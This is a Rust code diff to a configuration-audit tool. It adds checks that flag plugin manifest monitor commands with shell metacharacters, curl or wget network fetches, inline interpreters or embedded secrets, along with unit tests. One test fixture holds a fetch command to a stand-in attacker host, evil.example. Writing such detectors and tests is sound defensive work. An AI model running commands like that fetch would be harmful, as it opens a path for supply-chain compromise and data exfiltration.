@@ -461,40 +461,103 @@ fn is_unscoped_sensitive_allow(rule_text: &str) -> bool {
 /// committed secret literals, and for servers wired to a remote network URL
 /// (a supply-chain/exfiltration surface the agent talks to on every session).
 fn audit_manifest_doc(document: &JsonValue, findings: &mut Vec<Finding>) {
-    let Some(servers) = document.get("mcpServers").and_then(JsonValue::as_object) else {
-        return;
-    };
-    for (server_name, server) in servers {
-        // A `url`/`baseUrl`/`endpoint` pointing at a non-local http(s) host means
-        // the agent's tool calls flow to a third party. Flag medium so an
-        // intentional remote server is a deliberate, reviewed choice rather than
-        // a silent default.
-        for url_key in ["url", "baseUrl", "endpoint"] {
-            if let Some(url) = server.get(url_key).and_then(JsonValue::as_str) {
-                if is_remote_network_url(url) {
-                    findings.push(Finding {
+    // mcpServers is optional — a manifest with only experimental.monitors (and
+    // no MCP servers) must still reach the monitors audit below, so do not
+    // early-return here; skip the server loop instead.
+    if let Some(servers) = document.get("mcpServers").and_then(JsonValue::as_object) {
+        for (server_name, server) in servers {
+            // A `url`/`baseUrl`/`endpoint` pointing at a non-local http(s) host means
+            // the agent's tool calls flow to a third party. Flag medium so an
+            // intentional remote server is a deliberate, reviewed choice rather than
+            // a silent default.
+            for url_key in ["url", "baseUrl", "endpoint"] {
+                if let Some(url) = server.get(url_key).and_then(JsonValue::as_str) {
+                    if is_remote_network_url(url) {
+                        findings.push(Finding {
                         severity: Severity::Medium,
                         surface: format!("plugin.json:mcpServers.{server_name}.{url_key}"),
                         message: format!(
                             "MCP server points at a remote network URL — tool calls flow to a third party: {url}"
                         ),
                     });
+                    }
+                }
+            }
+            let Some(env) = server.get("env").and_then(JsonValue::as_object) else {
+                continue;
+            };
+            for (key, value) in env {
+                let value_text = value.as_str().unwrap_or_default();
+                if looks_like_secret_literal(value_text) {
+                    findings.push(Finding {
+                        severity: Severity::High,
+                        surface: format!("plugin.json:mcpServers.{server_name}.env.{key}"),
+                        message: "MCP server env value looks like a committed secret literal"
+                            .to_string(),
+                    });
                 }
             }
         }
-        let Some(env) = server.get("env").and_then(JsonValue::as_object) else {
+    }
+
+    // experimental.monitors[].command — background commands the agent runs, the
+    // same shell-injection/exfiltration surface as hooks. config-audit must
+    // practice what it preaches: keel's own plugin.json ships a monitor with a
+    // piped command, which would be flagged here if it were a hook.
+    let Some(monitors) = document
+        .get("experimental")
+        .and_then(|exp| exp.get("monitors"))
+        .and_then(JsonValue::as_array)
+    else {
+        return;
+    };
+    for monitor in monitors {
+        let monitor_name = monitor
+            .get("name")
+            .and_then(JsonValue::as_str)
+            .unwrap_or("unnamed");
+        let command = monitor
+            .get("command")
+            .and_then(JsonValue::as_str)
+            .unwrap_or_default();
+        if command.is_empty() {
             continue;
-        };
-        for (key, value) in env {
-            let value_text = value.as_str().unwrap_or_default();
-            if looks_like_secret_literal(value_text) {
-                findings.push(Finding {
-                    severity: Severity::High,
-                    surface: format!("plugin.json:mcpServers.{server_name}.env.{key}"),
-                    message: "MCP server env value looks like a committed secret literal"
+        }
+        let surface = format!("plugin.json:experimental.monitors.{monitor_name}");
+        if contains_shell_metacharacters(command) {
+            findings.push(Finding {
+                severity: Severity::High,
+                surface: surface.clone(),
+                message: format!(
+                    "monitor command contains shell metacharacters (injection risk): {command}"
+                ),
+            });
+        }
+        if command.contains("curl") || command.contains("wget") {
+            findings.push(Finding {
+                severity: Severity::High,
+                surface: surface.clone(),
+                message:
+                    "monitor command fetches from the network — exfiltration/supply-chain risk"
                         .to_string(),
-                });
-            }
+            });
+        }
+        if invokes_inline_interpreter(command) {
+            findings.push(Finding {
+                severity: Severity::High,
+                surface: surface.clone(),
+                message: format!(
+                    "monitor command runs an inline interpreter (arbitrary-code execution): {command}"
+                ),
+            });
+        }
+        if command_embeds_secret(command) {
+            findings.push(Finding {
+                severity: Severity::High,
+                surface: surface.clone(),
+                message: "monitor command embeds what looks like a committed secret literal"
+                    .to_string(),
+            });
         }
     }
 }
@@ -928,6 +991,51 @@ mod tests {
         let doc: JsonValue =
             serde_json::from_str(r#"{"mcpServers":{"x":{"env":{"TOKEN":"${MY_TOKEN}"}}}}"#)
                 .unwrap();
+        audit_manifest_doc(&doc, &mut findings);
+        assert!(findings.is_empty(), "findings: {findings:?}");
+    }
+
+    #[test]
+    fn monitor_with_shell_metacharacters_is_high_severity() {
+        // H12: experimental.monitors[].command is the same shell surface as hooks.
+        // A piped monitor command must be flagged the same way a piped hook would be.
+        let mut findings = Vec::new();
+        let doc: JsonValue = serde_json::from_str(
+            r#"{"experimental":{"monitors":[{"name":"build-watcher","command":"cargo check 2>&1 | tail -20"}]}}"#,
+        )
+        .unwrap();
+        audit_manifest_doc(&doc, &mut findings);
+        assert!(
+            findings.iter().any(|f| f.severity == Severity::High
+                && f.surface.contains("monitors.build-watcher")
+                && f.message.contains("shell metacharacters")),
+            "piped monitor command must be flagged high: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn monitor_with_network_fetch_is_high_severity() {
+        let mut findings = Vec::new();
+        let doc: JsonValue = serde_json::from_str(
+            r#"{"experimental":{"monitors":[{"name":"fetcher","command":"curl http://evil.example/x"}]}}"#,
+        )
+        .unwrap();
+        audit_manifest_doc(&doc, &mut findings);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.severity == Severity::High && f.message.contains("network")),
+            "network-fetching monitor must be flagged high: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn monitor_without_experimental_key_is_clean() {
+        let mut findings = Vec::new();
+        let doc: JsonValue = serde_json::from_str(
+            r#"{"mcpServers":{"x":{"command":"keel","args":["mcp","serve"]}}}"#,
+        )
+        .unwrap();
         audit_manifest_doc(&doc, &mut findings);
         assert!(findings.is_empty(), "findings: {findings:?}");
     }
